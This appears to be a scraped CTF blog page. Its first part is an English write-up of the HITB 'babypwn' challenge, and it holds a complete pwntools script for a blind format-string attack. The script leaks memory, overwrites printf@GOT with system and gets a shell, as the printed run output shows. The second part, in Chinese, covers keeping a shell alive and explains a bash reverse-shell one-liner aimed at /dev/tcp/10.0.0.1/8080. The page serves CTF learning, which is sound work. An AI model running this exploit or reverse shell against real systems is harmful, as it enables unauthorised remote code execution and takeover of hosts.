<li><a href="https://youtu.be/XuzuFUGuQv0" target="_blank" rel="external">Video from @LiveOverflow:</a></li>
</ul>
<p>In order to solve the challenge, I used the script from <a href="https://twitter.com/jay_f0xtr0t" target="_blank" rel="external">@jay_f0xtr0t</a> (<a href="https://github.com/InfoSecIITR/write-ups/blob/master/2016/33c3-ctf-2016/pwn/espr/espr.py" target="_blank" rel="external">available here</a>) that I adapted a little bit.</p>
<p>Below is the explanation of what the different parts of the code do :</p>
<p>First, we connect to the challenge (obviously) and set the architecture accordingly.<br>The challenge is a 64-bit binary : our <code>%p</code> inputs reveal addresses like <code>0x7f2a8a02f780</code> which start with <code>0x7f</code> and are 6 bytes long.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div></pre></td></tr></table></figure>
<p>The <code>exec_payload</code> function is the function that exploits the format string vulnerability strictly speaking.<br>We prepend an arbitrary value (<code>_EOF</code> in this case but it could have been something else…) to our payload and the function will parse the server’s response until it reaches our value.<br>We ignore <code>\n</code> because if the server is using the <code>gets</code> function (or similar) for reading our input, the fact that there is a newline character will cause a weird behaviour : the function will replace <code>\n</code> with <code>\x00</code> (null byte) and we will get the output twice.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div></pre></td></tr></table></figure>
<p>The <code>find_elf</code> function attempts to find an address that might be in the ELF binary.<br>To do so, it looks for an address starting with <code>0x400</code> (because <code>0x400000</code> is the default base address for binaries).<br>The address that we find will be useful later when we will use the <code>DynELF</code> function from PwnTools.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_leak_point</code> function attempts to find the correct offset so that our input refers to itself and is sent back to us.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div></pre></td></tr></table></figure>
<p>The <code>leak</code> function leaks data from the address given as argument.<br>Some workarounds were made by the initial creator to handle the case of the special <code>\n</code> that we previously mentionned.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div></pre></td></tr></table></figure>
<p>Now using <a href="http://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="external"><code>DynELF</code></a> from PwnTools, we can find the addresses of the <code>printf</code> and <code>system</code>functions.<br>The idea behind this is to overwrite the <code>printf</code> address from the Global Offset Table (GOT) with the one from <code>system</code>.<br>By doing so, when the server will attempt to reply to our request, it will use the <code>system</code> function instead of the <code>printf</code> function and thus execute the payload we send.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div></pre></td></tr></table></figure>
<p>The <code>find_plt_got</code> function attempts to find the address of the GOT inside the Procedure Linkage Table (PLT).<br>Indeed, the addresses for the <code>printf</code> and <code>system</code> functions we found before are in reality jumps to other addresses.<br>So if we find the GOT, we will be able to have the real address of the <code>printf</code>function from the GOT.<br>If you don’t get this point, you may want to take a look at <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4" target="_blank" rel="external">this video</a> from <a href="https://twitter.com/liveoverflow" target="_blank" rel="external">@LiveOverflow</a>.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># PLT/GOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div></pre></td></tr></table></figure>
<p>The <code>forge_exploit</code> function generates the final payload to be send to the server, replacing the value at the given address by the one we choose.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div></pre></td></tr></table></figure>
<p>Below is the full exploit code :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">conn = remote(<span class="string">'47.75.182.113'</span>, <span class="number">9999</span>)</div><div class="line">context.update(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>)</div><div class="line"></div><div class="line">DEPTH = <span class="number">100</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_payload</span><span class="params">(payload)</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'\n'</span> <span class="keyword">in</span> payload:</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span></div><div class="line">    conn.sendline(<span class="string">"_EOF"</span> + payload)</div><div class="line">    conn.recvuntil(<span class="string">"_EOF"</span>)</div><div class="line">    data = conn.recv()</div><div class="line">    <span class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_elf</span><span class="params">(depth)</span>:</span></div><div class="line">    log.info(<span class="string">'Finding ELF. This might take a few seconds...'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, depth + <span class="number">1</span>):</div><div class="line">        data = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span>)</div><div class="line">        <span class="keyword">if</span> (len(data) == <span class="number">8</span> <span class="keyword">and</span> data[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">'0x400'</span>):</div><div class="line">			log.success(<span class="string">'FOUND ELF !'</span>)</div><div class="line">			<span class="keyword">return</span> int(data, <span class="number">16</span>)</div><div class="line"></div><div class="line">start_address_elf = find_elf(DEPTH)</div><div class="line">log.info(<span class="string">'Using address %s'</span> % hex(start_address_elf))</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_leak_point</span><span class="params">()</span>:</span></div><div class="line">    log.info(<span class="string">'Finding leak point'</span>)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">200</span>):</div><div class="line">        r = exec_payload(<span class="string">'%'</span> + str(i) + <span class="string">'$p'</span> + <span class="string">'AAAAAAAA'</span> + <span class="string">'BBBBBBBB'</span>)</div><div class="line">        <span class="keyword">if</span> <span class="string">'0x4242424242424242'</span> <span class="keyword">in</span> r: <span class="comment"># chr(0x42) = 'B'</span></div><div class="line">            <span class="keyword">return</span> i</div><div class="line"></div><div class="line">leak_point = find_leak_point()</div><div class="line">log.success(<span class="string">'FOUND leak point %d'</span> % leak_point)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></div><div class="line">    addr &amp;= (<span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span>)</div><div class="line">    r = exec_payload(<span class="string">'%'</span> + str(leak_point) + <span class="string">'$s'</span> + <span class="string">'XXXXXXXX'</span> + p64(addr))</div><div class="line">    <span class="keyword">if</span> r == <span class="string">''</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    r = r[:r.index(<span class="string">'XXXXXXXX'</span>)]</div><div class="line">    <span class="keyword">if</span> r == <span class="string">'(null)'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> r + <span class="string">'\x00'</span></div><div class="line"></div><div class="line">d = DynELF(leak, start_address_elf)</div><div class="line">dynamic_addr = d.dynamic</div><div class="line">printf_addr = d.lookup(<span class="string">'printf'</span>, <span class="string">'libc'</span>)</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_plt_got</span><span class="params">()</span>:</span></div><div class="line">    addr = dynamic_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">2</span>)</div><div class="line">        <span class="keyword">if</span> x == <span class="string">'\x03\x00'</span>: <span class="comment"># type PLTGOT</span></div><div class="line">            addr += <span class="number">8</span></div><div class="line">            <span class="keyword">return</span> u64(d.leak.n(addr, <span class="number">8</span>))</div><div class="line">        addr += <span class="number">0x10</span></div><div class="line"></div><div class="line">got_addr = find_plt_got()</div><div class="line">log.success(<span class="string">'FOUND GOT Address: %s'</span> % hex(got_addr))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_printf</span><span class="params">()</span>:</span></div><div class="line">    addr = got_addr</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        x = d.leak.n(addr, <span class="number">8</span>)</div><div class="line">        <span class="keyword">if</span> x == p64(printf_addr):</div><div class="line">            <span class="keyword">return</span> addr</div><div class="line">        addr += <span class="number">8</span></div><div class="line"></div><div class="line">printf_got = find_printf()</div><div class="line">log.success(<span class="string">'FOUND printf@GOT : %s'</span> % hex(printf_got))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">forge_exploit</span><span class="params">(addr, val)</span>:</span></div><div class="line">    ret = <span class="string">''</span></div><div class="line">    curout = <span class="number">4</span></div><div class="line">    dist_to_addr = <span class="number">12</span> + <span class="number">8</span>*<span class="number">20</span></div><div class="line">    reader = (dist_to_addr / <span class="number">8</span>) + <span class="number">7</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        diff = (val &amp; <span class="number">0xff</span>) - curout</div><div class="line">        curout = (val &amp; <span class="number">0xff</span>)</div><div class="line">        val /= <span class="number">0x100</span></div><div class="line">        <span class="keyword">if</span> diff &lt; <span class="number">20</span>:</div><div class="line">            diff += <span class="number">0x100</span></div><div class="line">        ret += <span class="string">'%0'</span> + str(diff) + <span class="string">'u'</span></div><div class="line">        ret += <span class="string">'%'</span> + str(reader) + <span class="string">'$hhn'</span></div><div class="line">        reader += <span class="number">1</span></div><div class="line">    ret += <span class="string">'A'</span>*(dist_to_addr - len(ret))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</div><div class="line">        ret += p64(addr + i)</div><div class="line">    <span class="keyword">return</span> ret</div><div class="line"></div><div class="line">log.info(<span class="string">"SENDING PAYLOAD, PEW PEW !!!"</span>)</div><div class="line">exec_payload(forge_exploit(printf_got, system_addr))</div><div class="line">conn.sendline(<span class="string">'/bin/sh'</span>)</div><div class="line"></div><div class="line">log.success(<span class="string">"ENJOY YOUR SHELL :)"</span>)</div><div class="line">conn.interactive()</div><div class="line"></div><div class="line">conn.close()</div></pre></td></tr></table></figure>
<h3 id="Revealing-its-secret"><a href="#Revealing-its-secret" class="headerlink" title="Revealing its secret"></a>Revealing its secret</h3><p>It’s now time to run our exploit :</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">florent@kali:~# python exploit.py</div><div class="line"></div><div class="line">[+] Opening connection to 47.75.182.113 on port 9999: Done</div><div class="line">[*] Finding ELF. This might take a few seconds...</div><div class="line">[+] FOUND ELF !</div><div class="line">[*] Using address 0x40076d</div><div class="line">[*] Finding leak point</div><div class="line">[+] FOUND leak point 8</div><div class="line">[!] No ELF provided.  Leaking is much faster if you have a copy of the ELF being leaked.</div><div class="line">[*] PT_DYNAMIC</div><div class="line">[*] PT_DYNAMIC header = 0x400040</div><div class="line">[*] PT_DYNAMIC count = 0x9</div><div class="line">[*] PT_DYNAMIC @ 0x600e20</div><div class="line">[+] Resolving 'printf' in 'libc.so': 0x7f02b722e168</div><div class="line">[*] Trying lookup based on Build ID: b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] Skipping unavialable libc b5381a457906d279073822a5ceb24c4bfef94ddb</div><div class="line">[*] .gnu.hash/.hash, .strtab and .symtab offsets</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[*] Found DT_GNU_HASH at 0x7f02b7000c00</div><div class="line">[*] Found DT_STRTAB at 0x7f02b7000c10</div><div class="line">[*] Found DT_SYMTAB at 0x7f02b7000c20</div><div class="line">[*] .gnu.hash parms</div><div class="line">[*] hash chain index</div><div class="line">[*] hash chain</div><div class="line">[+] FOUND GOT Address: 0x601000</div><div class="line">[+] FOUND printf@GOT : 0x601020</div><div class="line">[*] SENDING PAYLOAD, PEW PEW !!!</div><div class="line">[+] ENJOY YOUR SHELL :)</div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> ls</div><div class="line">babypwn</div><div class="line">bin</div><div class="line">dev</div><div class="line">flag</div><div class="line">lib</div><div class="line">lib32</div><div class="line">lib64</div><div class="line"><span class="meta">$</span> cat flag</div><div class="line">HITB&#123;Baby_Pwn_BabY_bl1nd&#125;</div></pre></td></tr></table></figure>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/10/shell之后的操作/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/04/10/shell之后的操作/" itemprop="url">shell之后的操作</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-10T00:00:26+08:00">
                2018-04-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！</p>
<h3 id="0x01-shell"><a href="#0x01-shell" class="headerlink" title="0x01 shell"></a>0x01 shell</h3><p>首先还是得讲<a href="/2017/12/09/反弹Shell/">反弹shell和正向连接shell</a></p>
<p>前面的这篇文章有了很好的讲解</p>
<h3 id="0x02-延时操作"><a href="#0x02-延时操作" class="headerlink" title="0x02 延时操作"></a>0x02 延时操作</h3><p>若是你上面的操作都不可实现，那么不妨尝试利用下面的指令</p>
<h4 id="timeout指令"><a href="#timeout指令" class="headerlink" title="timeout指令"></a>timeout指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">timeout 3000 /bin/bash</div><div class="line">timeout 3000 /bin/sh</div></pre></td></tr></table></figure>
<p>timeout是linux上常见指令，当你想长时间连上shell不断开的话，不妨使用此命令。</p>
<h4 id="sleep指令"><a href="#sleep指令" class="headerlink" title="sleep指令"></a>sleep指令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sleep 3		    终端睡眠3秒</div><div class="line">sleep infinity  终端睡眠无限长事件</div></pre></td></tr></table></figure>
<h3 id="0x03-重定向"><a href="#0x03-重定向" class="headerlink" title="0x03 重定向"></a>0x03 重定向</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&quot;1&gt;&quot; 通常可以省略成 &quot;&gt;&quot;</div><div class="line">1&gt;&amp;2  把正确返回值 传递给 2输出通道 ，&amp;2表示2输出通道 </div><div class="line">2&gt;&amp;1 把错误返回值 传递给1输出通道, 同样&amp;1表示1输出通道. </div><div class="line"></div><div class="line">反弹shell:</div><div class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</div><div class="line">bash -i 一个交互的bash，并且连上具体ip、port，</div><div class="line">&gt;&amp; /dev/tcp/HOST/PORT  表示标准输入与标准输出通过这个连接发出</div><div class="line">0&gt;&amp;1  标准输入通过这个连接读入</div></pre></td></tr></table></figure>
<p><a href="http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/" target="_blank" rel="external">反弹shell的官方解释</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/dev/fd/fd</div><div class="line">If fd is a valid integer, file descriptor fd is duplicated.</div><div class="line"></div><div class="line">/dev/stdin</div><div class="line">File descriptor 0 is duplicated.</div><div class="line"></div><div class="line">/dev/stdout</div><div class="line">File descriptor 1 is duplicated.</div><div class="line"></div><div class="line">/dev/stderr</div><div class="line">File descriptor 2 is duplicated.</div><div class="line"></div><div class="line">/dev/tcp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding TCP socket.</div><div class="line"></div><div class="line">/dev/udp/host/port</div><div class="line">If host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding UDP socket.</div></pre></td></tr></table></figure>
<p>&quot;>\&amp;&quot;操作符的含义：</p>
<ul>
<li>在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。</li>
<li>在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符</li>
</ul>
<ul>
<li>&quot;&gt;word&quot; 当word为1的时候，</li>
</ul>
<ul>
<li>“word&lt;”  当word为0，代表后面的输出转为输入；当word为1或2时，其实含义与&quot;&gt;1&quot;或&quot;&gt;2&quot;一致</li>
</ul>
<p>仅有代码”bash -i”时输入输出状态</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">标准输入、标准输出和标准错误 全部指向shell（此状态定义为状态A）</div><div class="line"> ---       +--------+</div><div class="line">( 0 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 1 ) ----&gt;| shell  |</div><div class="line"> ---       +--------+</div><div class="line"> ---       +--------+</div><div class="line">( 2 ) ----&gt;|  shell |</div><div class="line"> ---       +--------+</div></pre></td></tr></table></figure>
<p>命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态</p>
